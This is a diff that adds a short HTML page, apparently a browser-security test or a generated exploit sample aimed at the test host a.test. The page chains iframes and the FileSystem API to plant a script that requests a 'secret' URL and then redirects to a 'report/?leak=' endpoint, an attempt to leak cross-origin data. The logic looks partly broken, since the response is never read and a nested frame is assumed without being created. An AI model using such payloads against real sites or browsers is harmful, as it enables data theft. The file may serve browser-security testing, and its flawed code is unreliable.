@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <iframe src="https://a.test/GenAI-38-Examples-4o-Latest/c1117687/helper" onload="loadAttackerFrame()"></iframe>
+    <script>
+        function loadAttackerFrame() {
+            var iframe = document.createElement('iframe');
+            iframe.src = 'https://a.test/report/?leak=c1117687';
+            iframe.onload = function() {
+                window.requestFileSystem(window.TEMPORARY, 1024, function(fs) {
+                    fs.root.getFile('data.html', {create: true}, function(fileEntry) {
+                        fileEntry.createWriter(function(writer) {
+                            writer.write(new Blob(['<script>var xhr = new XMLHttpRequest(); xhr.open(\'GET\', \'https://a.test/GenAI-38-Examples-4o-Latest/c1117687/secret\', true); xhr.send(); setTimeout(function() { document.location.href = \'https://a.test/report/?leak=c1117687\'; }, 1000);<\/script>'], {type: 'text/html'}));
+                            iframe.contentWindow.frames[0].location = fileEntry.toURL();
+                        });
+                    });
+                });
+            };
+            document.body.appendChild(iframe);
+        }
+    </script>
+</body>
+</html>
